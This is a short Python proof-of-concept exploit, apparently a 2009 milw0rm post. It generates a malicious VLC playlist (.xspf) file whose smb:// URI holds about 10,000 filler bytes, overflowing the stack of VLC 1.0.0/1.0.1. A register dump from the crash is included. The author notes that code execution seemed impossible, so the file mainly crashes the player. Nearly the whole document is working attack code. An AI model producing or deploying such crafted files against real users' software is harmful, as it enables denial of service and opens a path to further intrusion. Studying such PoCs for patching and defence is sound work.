#!/usr/bin/env python

############################################################################
#
# VLC Media Player 1.0.0\1.0.1 smb:// URI Handling Remote Stack Overflow PoC
# Found By:	Dr_IDE
# Tested:	Windows XP SP2 , XP SP3 and Windows 7 RC1
# Thanks:	Pankaj Kohli for finding this in 0.8.6f
# Original:	http://www.milw0rm.com/exploits/9303
#
############################################################################

# Crash Breakdown of vlc v1.0.1 on XP SP2/SP3
"""
EAX FFFFFFFE
ECX 42424242 <---- Bytes 3-6 of our payload
EDX 00000000
EBX 42424242 <---- Bytes 3-6 of our payload
ESP 02CBF694
EBP 02CBF7C4
ESI 61CC8324 libacc_4.61CC8324
EDI 61CC8323 libacc_4.61CC8323
EIP 77C478AC msvcrt.77C478AC
C 0  ES 0023 32bit 0(FFFFFFFF)
P 0  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFAC000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty -UNORM FB18 77C2C3E7 00E128A0
ST1 empty +UNORM 2088 00000000 00000000
ST2 empty %#.19L
ST3 empty -??? FFFF 00000000 77C2C42E
ST4 empty 0.9999999999999289457
ST5 empty %#.19L
ST6 empty 0.9999999999999289457
ST7 empty 0.5000000000000000000
               3 2 1 0      E S P U O Z D I
FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
"""


header1 =  ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
header1 += ("<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n")
header1 += ("\t<title>Playlist</title>\n")
header1 += ("\t<trackList>\n")
header1 += ("\t\t<track>\n")
header1 += ("\t\t\t<location>smb://example.com@www.example.com/foo/#{")

# Stack Overwrite after first 2 bytes of URI. It seems that you can't put traditional NOP's in here BTW.
# Code execution does not seem possible.

payload = ("\x41" * 2 + "\x42" * 4 + "\x43" * 10000)

header2 =  ("}</location>\n");
header2 += ("\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
header2 += ("\t\t\t\t<vlc:id>0</vlc:id>\n");
header2 += ("\t\t\t</extension>\n");
header2 += ("\t\t</track>\n");
header2 += ("\t</trackList>\n");
header2 += ("</playlist>\n");

try:
    f1 = open("vlc_1.0.X.xspf","w")
    f1.write(header1 + payload + header2)
    f1.close()
    print("\nExploit file created!\n")
except:
    print "Error"

# milw0rm.com [2009-08-13]